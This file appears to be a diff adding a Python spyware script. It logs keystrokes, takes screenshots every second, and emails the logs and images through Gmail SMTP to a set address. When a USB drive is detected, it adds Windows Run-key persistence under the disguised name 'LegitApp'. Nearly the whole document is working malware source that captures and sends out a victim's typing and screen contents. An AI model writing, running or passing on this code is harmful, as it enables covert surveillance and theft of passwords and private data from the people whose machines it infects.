@@ -1,0 +1,144 @@
+import os
+import winreg
+import time
+import pynput.keyboard
+import pyautogui
+import cv2
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from fpdf import FPDF  # Make sure to install fpdf: pip install fpdf
+
+# Globals
+log = ""  # Holds keystrokes
+gmail_user = 'your_email@gmail.com'  # Replace with your Gmail address
+gmail_password = 'your_password'  # Replace with your Gmail password
+usb_drive_letter = "E:"  # Replace with the actual letter of the USB drive
+
+# Function to create a PNG file
+def create_png_file():
+    """Create a PNG file by taking a screenshot."""
+    image = pyautogui.screenshot()  # Taking a screenshot
+    image.save("screenshot.png")  # Save the screenshot as PNG
+    print("PNG file created.")
+
+# Function to create a PDF file
+def create_pdf_file():
+    """Create a PDF file."""
+    pdf = FPDF()
+    pdf.add_page()
+    pdf.set_font("Arial", size=12)
+    pdf.cell(200, 10, txt="Data from capture.", ln=True, align='C')
+    pdf.output("data.pdf")  # Save as PDF
+    print("PDF file created.")
+
+# Function to create a TXT file
+def create_txt_file():
+    """Create a TXT file."""
+    with open("data.txt", "w") as f:
+        f.write(log)  # Write log data to the TXT file
+    print("TXT file created.")
+
+# Function to send multiple files to Gmail
+def send_files_to_gmail():
+    msg = MIMEMultipart()
+    msg['From'] = gmail_user
+    msg['To'] = gmail_user  # Send to yourself
+    msg['Subject'] = 'Files from Python Script'
+
+    # Attach files
+    send_file("screenshot.png", msg)
+    send_file("data.pdf", msg)
+    send_file("data.txt", msg)
+
+    send_email(msg)
+
+# Function to attach files to email
+def send_file(file_path, msg):
+    """Attach a file to the email message."""
+    try:
+        with open(file_path, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
+            msg.attach(part)
+        print(f"Attached {file_path} to email.")
+    except Exception as e:
+        print(f"Failed to attach file {file_path}: {e}")
+
+# Function to send email
+def send_email(msg):
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(gmail_user, gmail_password)
+            server.send_message(msg)
+            print("Email sent successfully")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Keylogging (Monitoring Keystrokes)
+def on_press(key):
+    global log
+    try:
+        log += key.char  # Capture alphanumeric keys
+    except AttributeError:
+        log += f" [{str(key)}] "  # Capture special keys
+
+def start_keylogger():
+    with pynput.keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+def send_logs_to_gmail():
+    global log
+    if log:
+        create_txt_file()  # Create a TXT file with logs
+        send_files_to_gmail()  # Send the files including logs
+        log = ""  # Clear logs after sending
+
+# Function to continuously capture data every second
+def continuous_capture():
+    while True:
+        create_png_file()  # Create PNG file
+        create_pdf_file()  # Create PDF file
+        create_txt_file()  # Create TXT file
+        send_files_to_gmail()  # Send files to Gmail
+        time.sleep(1)  # Wait for 1 second before the next capture
+
+# Check for USB Insertion
+def check_for_usb():
+    while True:
+        drives = [d for d in os.popen("wmic logicaldisk get caption").read().split() if d]
+        if usb_drive_letter in drives:
+            print(f"{usb_drive_letter} plugged in!")
+            add_persistence()  # Add persistence on USB insertion
+            break
+        time.sleep(5)  # Check every 5 seconds
+
+# Persistence (Re-launch after Reboot)
+def add_persistence():
+    key = winreg.HKEY_CURRENT_USER
+    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "LegitApp"  # Use a non-suspicious name
+    executable_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), "your_application.exe")  # Path to your application
+
+    try:
+        registry_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, executable_path)
+        winreg.CloseKey(registry_key)
+        print("Persistence added successfully")
+    except Exception as e:
+        print(f"Failed to add persistence: {e}")
+
+# Main Function to Combine All
+def main():
+    # Start checking for USB in a separate thread
+    check_for_usb()  # Start checking for USB
+    start_keylogger()  # Start Keylogger
+    continuous_capture()  # Start continuous capture every second
+
+if __name__ == "__main__":
+    main()
